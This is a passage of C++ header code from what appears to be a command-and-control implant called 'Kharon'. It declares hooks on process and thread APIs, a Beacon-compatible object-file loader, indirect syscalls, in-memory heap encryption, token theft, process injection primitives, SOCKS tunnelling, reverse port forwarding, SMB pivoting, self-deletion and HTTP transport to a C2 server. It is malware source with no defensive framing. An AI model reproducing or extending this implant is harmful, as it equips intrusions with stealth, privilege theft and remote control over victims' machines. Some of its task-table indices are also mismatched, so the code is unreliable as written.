        HookTable[6]  = { Hsh::Str( "OpenProcess" ),        (UPTR)Self->Cf->OpenProcess },
        HookTable[7]  = { Hsh::Str( "OpenThread" ),         (UPTR)Self->Cf->OpenThread },
        HookTable[8]  = { Hsh::Str( "CreateThread" ),       (UPTR)Self->Cf->CreateThread },
        HookTable[9]  = { Hsh::Str( "CreateRemoteThread" ), (UPTR)Self->Cf->CreateRemoteThread },
        HookTable[10] = { Hsh::Str( "CreateProcessW" ),     (UPTR)Self->Cf->CreateProcessW },

        HookTable[11] = { Hsh::Str( "NtSetContextThread" ), (UPTR)Self->Cf->SetThreadContext },
        HookTable[12] = { Hsh::Str( "SetThreadContext" ),   (UPTR)Self->Cf->SetThreadContext },
        HookTable[13] = { Hsh::Str( "NtGetContextThread" ), (UPTR)Self->Cf->GetThreadContext },
        HookTable[14] = { Hsh::Str( "GetThreadContext" ),   (UPTR)Self->Cf->GetThreadContext },

        HookTable[15] = { Hsh::Str( "CLRCreateInsetance" ), (UPTR)Self->Cf->CLRCreateInstance },  
        HookTable[16] = { Hsh::Str( "CoInitialize" ),       (UPTR)Self->Cf->CoInitialize },
        HookTable[17] = { Hsh::Str( "CoInitializeEx" ),     (UPTR)Self->Cf->CoInitializeEx },

        HookTable[18] = { Hsh::Str( "LoadLibraryW" ),       (UPTR)Self->Cf->LoadLibraryW },
        HookTable[19] = { Hsh::Str( "LoadLibraryA" ),       (UPTR)Self->Cf->LoadLibraryA },
    };

    struct {
        UPTR  Hash;
        PVOID Ptr;
    } ApiTable[36] = {
        ApiTable[0]  = { Hsh::Str("BeaconDataParse"),   reinterpret_cast<PVOID>(&Coff::DataParse) },
        ApiTable[1]  = { Hsh::Str("BeaconDataInt"),     reinterpret_cast<PVOID>(&Coff::DataInt) },
        ApiTable[2]  = { Hsh::Str("BeaconDataExtract"), reinterpret_cast<PVOID>(&Coff::DataExtract) },
        ApiTable[3]  = { Hsh::Str("BeaconDataShort"),   reinterpret_cast<PVOID>(&Coff::DataShort) },
        ApiTable[4]  = { Hsh::Str("BeaconDataLength"),  reinterpret_cast<PVOID>(&Coff::DataLength) },
        ApiTable[5]  = { Hsh::Str("BeaconOutput"),      reinterpret_cast<PVOID>(&Coff::Output) },
        ApiTable[6]  = { Hsh::Str("BeaconPrintf"),      reinterpret_cast<PVOID>(&Coff::Printf) },
        ApiTable[7]  = { Hsh::Str("BeaconPrintfW"),     reinterpret_cast<PVOID>(&Coff::PrintfW) },

        ApiTable[8]  = { Hsh::Str("BeaconAddValue"),    reinterpret_cast<PVOID>(&Coff::AddValue) },
        ApiTable[9]  = { Hsh::Str("BeaconGetValue"),    reinterpret_cast<PVOID>(&Coff::GetValue) },
        ApiTable[10] = { Hsh::Str("BeaconRemoveValue"), reinterpret_cast<PVOID>(&Coff::RmValue) },

        ApiTable[11] = { Hsh::Str("BeaconVirtualAlloc"),     reinterpret_cast<PVOID>(&Coff::VirtualAlloc) },
        ApiTable[12] = { Hsh::Str("BeaconVirtualProtect"),   reinterpret_cast<PVOID>(&Coff::VirtualProtect) },
        ApiTable[13] = { Hsh::Str("BeaconVirtualAllocEx"),   reinterpret_cast<PVOID>(&Coff::VirtualAllocEx) },
        ApiTable[14] = { Hsh::Str("BeaconVirtualProtectEx"), reinterpret_cast<PVOID>(&Coff::VirtualProtectEx) },
        ApiTable[18] = { Hsh::Str("BeaconOpenProcess"),      reinterpret_cast<PVOID>(&Coff::OpenProcess) },
        ApiTable[19] = { Hsh::Str("BeaconOpenThread"),       reinterpret_cast<PVOID>(&Coff::OpenThread) },

        ApiTable[15] = { Hsh::Str("BeaconIsAdmin"),        reinterpret_cast<PVOID>(&Coff::IsAdmin) },
        ApiTable[16] = { Hsh::Str("BeaconUseToken"),       reinterpret_cast<PVOID>(&Coff::UseToken) },
        ApiTable[17] = { Hsh::Str("BeaconRevertToken"),    reinterpret_cast<PVOID>(&Coff::RevertToken) },

        ApiTable[20] = { Hsh::Str("BeaconFormatAlloc"),    reinterpret_cast<PVOID>(&Coff::FmtAlloc) },
        ApiTable[21] = { Hsh::Str("BeaconFormatAppend"),   reinterpret_cast<PVOID>(&Coff::FmtAppend) },
        ApiTable[22] = { Hsh::Str("BeaconFormatFree"),     reinterpret_cast<PVOID>(&Coff::FmtFree) },
        ApiTable[23] = { Hsh::Str("BeaconFormatInt"),      reinterpret_cast<PVOID>(&Coff::FmtInt) },
        ApiTable[24] = { Hsh::Str("BeaconFormatPrintf"),   reinterpret_cast<PVOID>(&Coff::FmtPrintf) },
        ApiTable[25] = { Hsh::Str("BeaconFormatReset"),    reinterpret_cast<PVOID>(&Coff::FmtReset) },
        ApiTable[26] = { Hsh::Str("BeaconFormatToString"), reinterpret_cast<PVOID>(&Coff::FmtToString) },

        ApiTable[29] = { Hsh::Str("BeaconPkgBytes"),   reinterpret_cast<PVOID>(&Coff::PkgBytes) },
        ApiTable[30] = { Hsh::Str("BeaconPkgInt8"),    reinterpret_cast<PVOID>(&Coff::PkgInt8) },
        ApiTable[31] = { Hsh::Str("BeaconPkgInt16"),   reinterpret_cast<PVOID>(&Coff::PkgInt16) },
        ApiTable[32] = { Hsh::Str("BeaconPkgInt32"),   reinterpret_cast<PVOID>(&Coff::PkgInt32) },
        ApiTable[33] = { Hsh::Str("BeaconPkgInt64"),   reinterpret_cast<PVOID>(&Coff::PkgInt64) },

        ApiTable[34] = { Hsh::Str("BeaconGetSpawnTo"),  reinterpret_cast<PVOID>(&Coff::GetSpawn) },
        ApiTable[35] = { Hsh::Str("BeaconInformation"), reinterpret_cast<PVOID>(&Coff::Information) },
    };

    auto Add( PVOID MmBegin, PVOID MmEnd, CHAR* UUID, ULONG CmdID, PVOID Entry ) -> BOF_OBJ*;
    auto GetTask( PVOID Address ) -> CHAR*;
    auto GetCmdID( PVOID Address ) -> ULONG;
    auto Rm( BOF_OBJ* Obj ) -> BOOL;

    inline auto RslRel( _In_ PVOID Base, _In_ PVOID Rel, _In_ UINT16 Type ) -> VOID;
    auto RslApi( _In_ PCHAR SymName ) -> PVOID;

    auto Loader( 
        _In_ BYTE* Buffer, _In_ ULONG Size, _In_ BYTE* Args, 
        _In_ ULONG Argc, _In_ CHAR* UUID, _In_ ULONG CmdID
    ) -> BOOL;

    auto Execute(
        _In_ COFF_MAPPED* Mapped, _In_ BYTE* Args, 
        _In_ ULONG Argc, _In_ CHAR* UUID, _In_ ULONG CmdID 
    ) -> BOOL;

    auto FindSymbol( _In_ COFF_MAPPED* Mapped, _In_ PCHAR SymName ) -> PVOID;
    auto Map( _In_  BYTE* Buffer, _In_ ULONG Size, _Out_ COFF_MAPPED* Mapped ) -> BOOL;
    auto Unmap( _In_ COFF_MAPPED* Mapped ) -> BOOL;
    auto Obfuscate( _In_ COFF_MAPPED* Mapped ) -> BOOL;
    auto Deobfuscate( _In_ COFF_MAPPED* Mapped ) -> BOOL;

    static auto DataExtract( DATAP* parser, PINT size ) -> PCHAR;
    static auto DataInt( DATAP* parser ) -> INT;
    static auto DataLength( DATAP* parser ) -> INT;
    static auto DataShort( DATAP* parser ) -> SHORT;
    static auto DataParse( DATAP* parser, PCHAR buffer, INT32 size ) -> VOID;

    static auto FmtAlloc( FMTP* fmt, INT32 maxsz ) -> VOID;
    static auto FmtAppend( FMTP* Fmt, CHAR* Data, INT32 Len ) -> VOID;
    static auto FmtFree( FMTP* fmt ) -> VOID;
    static auto FmtInt( FMTP* fmt, INT32 val ) -> VOID;
    static auto FmtPrintfW( FMTP* Fmt, WCHAR* Data, ... ) -> VOID;
    static auto FmtPrintf( FMTP* Fmt, CHAR* Data, ... ) -> VOID;

    static auto FmtReset( FMTP* fmt ) -> VOID;
    static auto FmtToString( FMTP* fmt, PINT size ) -> PCHAR;

    static auto IsAdmin( VOID ) -> BOOL;
    static auto UseToken( HANDLE token ) -> BOOL;
    static auto RevertToken( VOID ) -> VOID;
    static auto GetSpawn( BOOL x86, PCHAR buffer, INT32 length ) -> VOID;

    static auto DataStoreGetItem( SIZE_T Index ) -> DATA_STORE*;
    static auto DataStoreProtectItem( SIZE_T Index ) -> VOID;
    static auto DataStoreUnprotectItem( SIZE_T Index ) -> VOID;
    static auto DataStoreMaxEntries( VOID ) -> SIZE_T;

    static auto CreateThread( 
        LPSECURITY_ATTRIBUTES Attributes, SIZE_T StackSize, 
        LPTHREAD_START_ROUTINE Start, PVOID Parameter, ULONG Flags
    ) -> HANDLE;

    static auto CreateProcessW( 
        _In_  WCHAR* Application, _In_  WCHAR* Command, _In_  LPSECURITY_ATTRIBUTES PsAttributes,
        _In_  LPSECURITY_ATTRIBUTES ThreadAttributes, _In_ BOOL Inherit, _In_ ULONG Flags, _In_ PVOID Env, 
        _In_  WCHAR* CurrentDir, _In_ STARTUPINFOW* StartupInfo, _Out_ PROCESS_INFORMATION* PsInfo
    ) -> BOOL;

    static auto CreateRemoteThread(
        HANDLE Handle, LPSECURITY_ATTRIBUTES Attributes, SIZE_T StackSize, 
        LPTHREAD_START_ROUTINE Start, LPVOID Parameter, DWORD Flags, LPDWORD ThreadId
    ) -> HANDLE;

    static auto PkgCreate( _Out_ PACKAGE* Package ) -> VOID;
    static auto PkgDestroy( _In_ PACKAGE* Package ) -> VOID;
    static auto PkgInt8( _In_ BYTE Data ) -> VOID;
    static auto PkgInt16( _In_ INT16 Data ) -> VOID;
    static auto PkgInt32( _In_ INT32 Data ) -> VOID;
    static auto PkgInt64( _In_ INT32 Data ) -> VOID;
    static auto PkgBytes( _In_ PBYTE Buffer, _In_ ULONG Length ) -> VOID;

    static auto AddValue( _In_ PCCH key, _In_ PVOID ptr ) -> BOOL;
    static auto GetValue( _In_ PCCH key ) -> PVOID;
    static auto RmValue( _In_ PCCH key ) -> BOOL;

    static auto Information( _Out_ BEACON_INFO* info ) -> BOOL;

    static auto PrintfW( _In_ INT32 type, PWCH fmt, ... ) -> VOID;
    static auto Printf( _In_ INT32 type, _In_ PCCH Fmt, ... ) -> VOID;
    static auto Output( _In_ INT32 type, _In_ PCCH data, _In_ INT32 len ) -> VOID;

    static auto ReadProcessMemory( HANDLE hProcess, PVOID BaseAddress, PVOID Buffer, SIZE_T Size, SIZE_T *Read ) -> BOOL;
    static auto WriteProcessMemory( HANDLE hProcess, PVOID BaseAddress, PVOID Buffer, SIZE_T Size, SIZE_T* Written ) -> BOOL;

    static auto VirtualAlloc( PVOID Address, SIZE_T Size, DWORD AllocType, DWORD Protect ) -> PVOID; 
    static auto VirtualAllocEx( HANDLE Handle, LPVOID Address, SIZE_T Size, DWORD AllocType, DWORD Protect ) -> PVOID; 
    static auto VirtualProtect( LPVOID Address, SIZE_T Size, DWORD NewProtect, PDWORD OldProtect ) -> BOOL;
    static auto VirtualProtectEx( HANDLE Handle, LPVOID Address, SIZE_T Size, DWORD NewProtect, PDWORD OldProtect ) -> BOOL;

    static auto OpenProcess( DWORD desiredAccess, BOOL inheritHandle, DWORD processId ) -> HANDLE;
    static auto OpenThread( DWORD desiredAccess, BOOL inheritHandle, DWORD threadId ) -> HANDLE;

    static auto LoadLibraryA( CHAR* LibraryName ) -> HMODULE;
    static auto LoadLibraryW( WCHAR* LibraryName ) -> HMODULE;

    static auto CLRCreateInstance( REFCLSID clsid, REFIID riid, LPVOID *ppInterface ) -> HRESULT;
    static auto CoInitialize( LPVOID pvReserved ) -> HRESULT;
    static auto CoInitializeEx( LPVOID pvReserved, DWORD dwCoInit ) -> HRESULT;    

    static auto GetThreadContext( HANDLE Handle, CONTEXT* Ctx ) -> BOOL;
    static auto SetThreadContext( HANDLE Handle, CONTEXT* Ctx ) -> BOOL; 
};

class Syscall {
private:
    Root::Kharon* Self;    
public:
    Syscall( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    INT8 Index;

    struct {
        ULONG ssn;
        ULONG Hash;
        UPTR  Address;
        UPTR  Instruction;
    } Ext[Sys::Last] = {};

    auto Fetch(
        _In_ INT8 SysIdx
    ) -> BOOL;
};

class Jobs {
private:
    Root::Kharon* Self;
public:
    Jobs( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    PACKAGE* PostJobs = nullptr;

    ULONG Count = 0;
    JOBS* List  = nullptr;

    CHAR TunnelUUID[37]   = "00000000-0000-0000-0000-000000000001"; 
    CHAR DownloadUUID[37] = "00000000-0000-0000-0000-000000000002";
    CHAR PostexUUID[37]   = "00000000-0000-0000-0000-000000000003"; 

    CHAR* CurrentUUID  = nullptr;
    ULONG CurrentCmdId = 0;
    ULONG CurrentSubId = 0;
    
    auto ExecuteAll( VOID ) -> LONG;
    auto static Execute( _In_ JOBS* Job ) -> ERROR_CODE;

    auto Send( _In_ PACKAGE* PostJobs ) -> VOID;
    auto Create( _In_ CHAR* UUID, _In_ PARSER* Parser, _In_ BOOL IsResponse = FALSE ) -> JOBS*;

    auto GetAll( VOID ) -> VOID;
    auto GetByID( _In_ ULONG ID ) -> JOBS*;
    auto GetByUUID( _In_ CHAR* UUID ) -> JOBS*;
    auto Remove( _In_ JOBS* Job ) -> BOOL;

    auto Cleanup( VOID ) -> VOID;
};

class Useful {
private:
    Root::Kharon* Self;
public:
    Useful( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    auto CfgAddrAdd( _In_ PVOID ImageBase, _In_ PVOID Function ) -> VOID;
    auto CfgPrivAdd( _In_ HANDLE hProcess, _In_ PVOID  Address, _In_ DWORD  Size ) -> VOID;

    auto CfgCheck( VOID ) -> BOOL;
    auto Guardrails( VOID ) -> BOOL;
    auto CheckWorktime( VOID ) -> BOOL;

    auto FindGadget( _In_ UPTR ModuleBase, _In_ UINT16 RegValue ) -> UPTR;

    auto SecVa( _In_ UPTR LibBase, _In_ UPTR SecHash ) -> ULONG;
    auto SecSize( _In_ UPTR LibBase, _In_ UPTR SecHash ) -> ULONG;

    auto NtStatusToError( _In_ NTSTATUS NtStatus ) -> ERROR_CODE;
    auto SelfDelete( VOID ) -> BOOL;
    auto CheckKillDate( VOID ) -> VOID;
};

class Package {
private:
    Root::Kharon* Self;

public:
    Package( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    PACKAGE* Shared = nullptr;

    auto Base64( _In_ const PVOID in, _In_ SIZE_T inlen, _Out_opt_ PVOID  out, _In_opt_ SIZE_T outlen, _In_ Base64Action Action  ) -> SIZE_T;
    auto Base32( _In_ const PVOID in, _In_ SIZE_T inlen, _Out_opt_ PVOID out, _In_opt_ SIZE_T outlen, _In_ Base32Action Action ) -> SIZE_T;
    auto Base64URL( _In_      const PVOID in, _In_      SIZE_T inlen, _Out_opt_ PVOID  out, _In_opt_  SIZE_T outlen, _In_      Base64URLAction Action ) -> SIZE_T;
    auto Hex( _In_ const PVOID in, _In_ SIZE_T inlen, _Out_opt_ PVOID out, _In_opt_ SIZE_T outlen, _In_ HexAction Action ) -> SIZE_T;

    auto SendOut( _In_ ULONG Type, _In_ ULONG CmdID, _In_ BYTE* Buffer, _In_ INT32 Length ) -> BOOL;
    auto FmtMsg( _In_ ULONG Type, _In_ CHAR* Message, ... ) -> BOOL;
    auto SendMsgA( _In_ ULONG Type, _In_ CHAR* Message ) -> BOOL;
    auto SendMsgW( _In_ ULONG Type, _In_ WCHAR* Message ) -> BOOL;

    auto Int16( _In_ PPACKAGE Package, _In_ INT16 dataInt ) -> VOID;
    auto Int32( _In_ PPACKAGE Package, _In_ INT32 dataInt ) -> VOID;
    auto Int64( _In_ PPACKAGE Package, _In_ INT64 dataInt ) -> VOID;
    auto Pad( _In_ PPACKAGE Package, _In_ PUCHAR Data, _In_ SIZE_T Size ) -> VOID;
    auto Bytes( _In_ PPACKAGE Package, _In_ PUCHAR Data, _In_ SIZE_T Size ) -> VOID;
    auto Str( _In_ PPACKAGE package, _In_ PCHAR data ) -> VOID;
    auto Wstr( _In_ PPACKAGE package, _In_ PWCHAR data ) -> VOID;
    auto Byte( _In_ PPACKAGE Package, _In_ BYTE dataInt ) -> VOID;

    auto Create( _In_ ULONG CommandID, _In_ PCHAR UUID ) -> PPACKAGE;
    auto PostJobs( VOID ) -> PPACKAGE;
    auto NewTask( VOID ) -> PPACKAGE;
    auto Checkin( VOID ) -> PPACKAGE;
    auto Destroy( _In_ PACKAGE* Package  ) -> VOID;
    auto Transmit( _In_ PACKAGE* Package, _Out_ PVOID* Response, _Out_ UINT64* Size ) -> BOOL;

    auto Error( _In_ ULONG ErrorCode ) -> VOID;
};

class Parser {
private:
    Root::Kharon* Self;
public:
    Parser( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    BOOL    Endian = FALSE;
    PPARSER Shared = nullptr;

    auto NewTask( _In_ PPARSER parser, _In_ PVOID Buffer, _In_ UINT64 size ) -> VOID;
    auto New( _In_ PPARSER parser, _In_ PVOID Buffer, _In_ UINT64 size ) -> VOID;
    auto Destroy( _In_ PPARSER Parser ) -> BOOL;   

    auto Pad( _In_ PPARSER parser, _Out_ ULONG size ) -> BYTE*;
    auto Byte( _In_ PPARSER Parser ) -> BYTE;
    auto Int16( _In_ PPARSER Parser ) -> INT16;
    auto Int32( _In_ PPARSER Parser ) -> INT32;
    auto Int64( _In_ PPARSER Parser ) -> INT64;
    auto Bytes( _In_  PPARSER parser, _Out_ ULONG*  size ) -> BYTE*;
    auto Str( _In_ PPARSER parser, _In_ ULONG* size ) -> PCHAR;
    auto Wstr( _In_ PPARSER parser, _In_ ULONG* size ) -> PWCHAR;
};

struct _HTTP_DATA {

};

class Transport {    
private:
    Root::Kharon* Self;
public:
    Transport( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    struct {
        CHAR*  FileID;
        BYTE*  BytesReceived;
        ULONG  ChunkSize;
        ULONG  CurChunk;
        ULONG  TotalChunks;
        CHAR*  Path;
        HANDLE FileHandle;
    } Up[30];
    
    struct {
        CHAR*  FileID;
        ULONG  ChunkSize;
        ULONG  CurChunk;
        ULONG  TotalChunks;
        CHAR*  Path;
        HANDLE FileHandle;
    } Down[30];

    struct {
        ULONG  ChannelID;
        CHAR*  Host;
        ULONG  Port;
        CHAR*  Username;
        CHAR*  Password;
        SOCKET Socket;
        BYTE   State;
	    BYTE   Mode;
        ULONG  StartTick;
        ULONG  WaitTime;
        ULONG  CloseTimer;
    } Tunnels[30];

    ULONG DownloadTasksCount = 0;
    ULONG TunnelTasksCount   = 0;

    ULONG RoundRobinIdx = 0;
    ULONG FailoverIdx   = 0;
    ULONG FailCount     = 0;

    auto StrategyRot( VOID ) -> HTTP_CALLBACKS*;

    auto CleanupHttpContext( HTTP_CONTEXT* Ctx ) -> BOOL;

    auto PrepareUrl(
        _In_ HTTP_CONTEXT*   Ctx,
        _In_ HTTP_CALLBACKS* Callback,
        _In_ BOOL            Secure
    ) -> BOOL;

    auto PrepareMethod(
        _In_  HTTP_CALLBACKS* Callback,
        _Out_ WCHAR**         OutMethodStr,
        _Out_ HTTP_METHOD*    OutMethod
    ) -> BOOL;

    auto EncodeClientData( 
        _In_ HTTP_CONTEXT*  Ctx,
        _In_ MM_INFO*       SendData, 
        _In_ MM_INFO*       EncodedData,
        _In_ OUTPUT_FORMAT* ClientOut
    ) -> BOOL;

    auto DecodeServerData( 
        _In_ HTTP_CONTEXT*  Ctx,
        _In_ MM_INFO*       RespData, 
        _In_ MM_INFO*       DecodedData,
        _In_ OUTPUT_FORMAT* ServerOut
    ) -> BOOL;

    auto ProcessClientOutput(
        _In_ HTTP_CONTEXT*  Ctx,
        _In_ MM_INFO*       EncodedData,
        _In_ OUTPUT_TYPE    ClientOutType,
        _In_ HTTP_ENDPOINT* Endpoint,
        _In_ HTTP_METHOD*   Method,
        _In_ OUTPUT_FORMAT* ClientOut
    ) -> BOOL;

    auto ProcessServerOutput(
        _In_ HTTP_CONTEXT*  Ctx,
        _In_ HANDLE         RequestHandle,
        _In_ CHAR*          cTargetUrl,
        _In_ OUTPUT_TYPE    ServerOutType,
        _In_ OUTPUT_FORMAT* ServerOut,
        _In_ MM_INFO*       RespData
    ) -> BOOL;

    auto SendHttpRequest(
        _In_ HTTP_CONTEXT* Ctx,
        _In_ WCHAR*   Method,
        _In_ WCHAR*   Path,
        _In_ WCHAR*   Headers,
        _In_ MM_INFO* Body,
        _In_ BOOL     Secure
    ) -> BOOL;

    auto ConnectToServer(
        _In_ HTTP_CONTEXT* Ctx,
        _In_ HTTP_CALLBACKS* Callback,
        _In_ BOOL   ProxyEnabled,
        _In_ WCHAR* ProxyUsername,
        _In_ WCHAR* ProxyPassword
    ) -> BOOL;

    auto OpenInternetSession(
        _In_ HTTP_CONTEXT*   Ctx,
        _In_ HTTP_CALLBACKS* Callback,
        _In_ BOOL            ProxyEnabled,
        _In_ WCHAR*          ProxyUrl
    ) -> BOOL;

    struct {
        PVOID  Node;
#if PROFILE_C2 == PROFILE_SMB
        PCHAR  Name;
        HANDLE Handle;
#endif
    } Pipe = {
        .Node = nullptr,
#if PROFILE_C2 == PROFILE_SMB
        .Name = SMB_PIPE_NAME
#endif
    };

    auto Checkin( VOID ) -> BOOL;

    auto SmbAdd( _In_ CHAR* NamedPipe, _In_ PVOID Parser, _In_ PVOID Package ) -> PVOID;
    auto SmbRm( _In_ PVOID SmbData ) -> BOOL;
    auto SmbGet( _In_ CHAR* SmbUUID ) -> PVOID;
    auto SmbList( VOID ) -> PVOID;

    auto Send( _In_ MM_INFO* SendData, _Out_opt_ MM_INFO* RecvData ) -> BOOL;
    auto SmbSend( _In_ MM_INFO* SendData, _Out_opt_ MM_INFO* RecvData ) -> BOOL;
    auto HttpSend( _In_ MM_INFO* SendData, _Out_opt_ MM_INFO* RecvData ) -> BOOL;
};

class Task {
private:
    Root::Kharon* Self;
public:
    Task( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    auto Dispatcher( VOID  ) -> VOID;

    auto Token( _In_ JOBS* Job ) -> ERROR_CODE;
    auto SelfDel( _In_ JOBS* Job ) -> ERROR_CODE;
    auto Download( _In_ JOBS* Job ) -> ERROR_CODE;
    auto Upload( _In_ JOBS* Job ) -> ERROR_CODE;

    auto Pivot( _In_ JOBS* Job ) -> ERROR_CODE;

    auto Postex( _In_ JOBS* Job ) -> ERROR_CODE;
    auto ExecBof( _In_ JOBS* Job ) -> ERROR_CODE;
    auto Exit( _In_ JOBS* Job ) -> ERROR_CODE;
    auto Jobs( _In_ JOBS* Job ) -> ERROR_CODE;

    auto Socks( _In_ JOBS* Job ) -> ERROR_CODE;
    auto ProcessTunnel( _In_ JOBS* Job ) -> ERROR_CODE;
    auto ProcessDownloads( _In_ JOBS* Job ) -> ERROR_CODE;
    auto RPortfwd( _In_ JOBS* Job ) -> ERROR_CODE;

    typedef auto ( Task::*TASK_FUNC )( JOBS* ) -> ERROR_CODE;

    struct {
        Action::Task ID;
        ERROR_CODE ( Task::*Run )( JOBS* );
    } Mgmt[TSK_LENGTH] = {
        Mgmt[0].ID  = Action::Task::Exit,              Mgmt[0].Run  = &Task::Exit,
        Mgmt[1].ID  = Action::Task::ExecBof,           Mgmt[3].Run  = &Task::ExecBof,
        Mgmt[2].ID  = Action::Task::PostEx,            Mgmt[4].Run  = &Task::Postex,
        Mgmt[3].ID  = Action::Task::Download,          Mgmt[5].Run  = &Task::Download,
        Mgmt[4].ID  = Action::Task::Upload,            Mgmt[6].Run  = &Task::Upload,
        Mgmt[5].ID  = Action::Task::Socks,             Mgmt[7].Run  = &Task::Socks,
        Mgmt[6].ID  = Action::Task::Token,             Mgmt[8].Run  = &Task::Token,
        Mgmt[7].ID  = Action::Task::Pivot,             Mgmt[9].Run  = &Task::Pivot,
        Mgmt[8].ID  = Action::Task::SelfDelete,        Mgmt[10].Run = &Task::SelfDel,
        Mgmt[9].ID  = Action::Task::Jobs,              Mgmt[14].Run = &Task::Jobs,
        Mgmt[10].ID = Action::Task::ProcessTunnels,    Mgmt[15].Run = &Task::ProcessTunnel,
        Mgmt[11].ID = Action::Task::ProcessDownloads,  Mgmt[16].Run = &Task::ProcessDownloads,
        Mgmt[12].ID = Action::Task::RPortfwd,          Mgmt[17].Run = &Task::RPortfwd
    };
};

class Process {
private:
    Root::Kharon* Self;
public:
    Process( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
    
    struct {
        PVOID p;
        ULONG s;
    } Out;

    auto Open(
        _In_ ULONG RightsAccess,
        _In_ BOOL  InheritHandle,
        _In_ ULONG ProcessID
    ) -> HANDLE;

    auto Create(
        _In_ WCHAR*                Application,
        _In_ WCHAR*                Command,
        _In_ ULONG                 Flags,
        _In_ LPSECURITY_ATTRIBUTES PsAttributes,
        _In_ LPSECURITY_ATTRIBUTES ThreadAttributes,
        _In_ BOOL                  Inherit,
        _In_ PVOID                 Env,
        _In_ WCHAR*                CurrentDir,
        _In_ STARTUPINFOW*         StartupInfo,
        _Out_ PROCESS_INFORMATION* PsInfo
    ) -> BOOL;
};

class Thread {
    private:
    Root::Kharon* Self;
public:
    Thread( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    auto GetCtx(
        HANDLE   Handle,
        CONTEXT* Ctx
    ) -> BOOL;

    auto SetCtx(
        HANDLE   Handle,
        CONTEXT* Ctx
    ) -> BOOL;

    auto QueueAPC(
        _In_     PVOID  CallbackFnc,
        _In_     HANDLE ThreadHandle,
        _In_opt_ PVOID  Argument1,
        _In_opt_ PVOID  Argument2,
        _In_opt_ PVOID  Argument3
    ) -> LONG;

    auto Create( 
        _In_  HANDLE ProcessHandle, 
        _In_  PVOID  StartAddress,
        _In_  PVOID  Parameter,
        _In_  ULONG  StackSize,
        _In_  ULONG  Flags,
        _Out_ ULONG* ThreadID,
        _In_  LPSECURITY_ATTRIBUTES Attributes
    ) -> HANDLE;

    auto Open( _In_ ULONG RightAccess, _In_ BOOL Inherit, _In_ ULONG ThreadID ) -> HANDLE;
    auto Enum( _In_ Action::Thread Type, _In_opt_ ULONG ProcessID = 0, _Out_opt_ ULONG ThreadQtt = 0, _Out_opt_ PSYSTEM_THREAD_INFORMATION ThreadInfo = nullptr ) -> ULONG;

    auto Rnd( VOID ) -> ULONG {
        return Enum( Action::Thread::Random, 0 );
    };
};

class Library {
private:
    Root::Kharon* Self;
public:
    Library( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    auto Load( _In_ PCHAR LibName ) -> UPTR;
};

class Token {
private:
    Root::Kharon* Self;
public:
    Token( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    TOKEN_NODE* Node = nullptr;

    auto CurrentPs( VOID ) -> HANDLE;
    auto CurrentThread( VOID ) -> HANDLE;

    auto GetByID( _In_ ULONG TokenID ) -> TOKEN_NODE*;

    auto Steal( _In_ ULONG ProcessID ) -> TOKEN_NODE*;
    auto GetUser(  _In_ HANDLE TokenHandle ) -> CHAR*;

    auto Add( _In_ HANDLE TokenHandle, _In_ ULONG ProcessID ) -> TOKEN_NODE*;
    auto Rm( _In_ ULONG TokenID ) -> BOOL;
    auto Use( _In_ HANDLE TokenHandle ) -> BOOL;

    auto TdOpen( _In_ HANDLE ThreadHandle, _In_ ULONG RightsAccess, _In_ BOOL OpenAsSelf, _Out_ HANDLE* TokenHandle ) -> BOOL;
    auto ProcOpen( _In_  HANDLE ProcessHandle, _In_ ULONG RightsAccess, _Out_ HANDLE* TokenHandle ) -> BOOL;

    auto GetPrivs( _In_ HANDLE TokenHandle ) -> BOOL;
    auto ListPrivs( _In_ HANDLE TokenHandle, _Out_ ULONG &ListCount ) -> PVOID;
    auto SetPriv( _In_ HANDLE Handle, _In_ CHAR* PrivName ) -> BOOL;

    auto Rev2Self( VOID ) -> BOOL;
    
};

class Heap {
private:
    Root::Kharon* Self;
public:
    Heap( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    HEAP_NODE* Node  = nullptr;
    ULONG      Count = 0;
    BYTE  XorKey[16] = { 0 };


    auto Crypt( VOID ) -> VOID;

    auto CheckPtr( _In_ PVOID Ptr ) -> BOOL;
    auto Append( _In_ PVOID Ptr, _In_ ULONG Size ) -> VOID;
    auto Clean( VOID ) -> VOID;

    auto Alloc( _In_ ULONG Size ) -> PVOID; 
    auto ReAlloc( _In_ PVOID Block, _In_ ULONG Size ) -> PVOID;
    auto Free( _In_ PVOID Block ) -> BOOL;
};

class Memory {
private:
    Root::Kharon* Self;
public:
    Memory( Root::Kharon* KharonRf ) : Self( KharonRf ) {};

    auto Alloc( _In_ PVOID Base, _In_ SIZE_T Size, _In_ ULONG AllocType, _In_ ULONG  Protect, _In_ HANDLE Handle = NtCurrentProcess() ) -> PVOID;
    auto Protect( _In_ PVOID Base, _In_ SIZE_T Size, _In_ ULONG NewProt, _Out_ ULONG *OldProt, _In_ HANDLE Handle = NtCurrentProcess() ) -> BOOL;
    auto Write( _In_ PVOID Base, _In_ BYTE* Buffer, _In_ ULONG Size, _Out_ SIZE_T* Written, _In_  HANDLE Handle = NtCurrentProcess() ) -> BOOL;
    auto Read( _In_ PVOID Base, _In_ BYTE* Buffer, _In_ SIZE_T Size, _Out_ SIZE_T* Reads, _In_ HANDLE Handle = NtCurrentProcess() ) -> BOOL;
    auto Free( _In_ PVOID Base, _In_ SIZE_T Size, _In_ ULONG  FreeType, _In_ HANDLE Handle = NtCurrentProcess() ) -> BOOL;

    auto MapView( 
        _In_ HANDLE SectionHandle, _In_ HANDLE ProcessHandle, _Inout_ PVOID *BaseAddress,
        _In_ ULONG_PTR ZeroBits, _In_ SIZE_T CommitSize, _Inout_opt_ LARGE_INTEGER* SectionOffset,
        _Inout_ SIZE_T* ViewSize, _In_ SECTION_INHERIT InheritDisposition, _In_ ULONG AllocationType, _In_ ULONG PageProtection
    ) -> LONG;

    auto CreateSection( 
        _Out_ HANDLE* SectionHandle, _In_ ACCESS_MASK DesiredAccess, _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes, _In_opt_ LARGE_INTEGER* MaximumSize, 
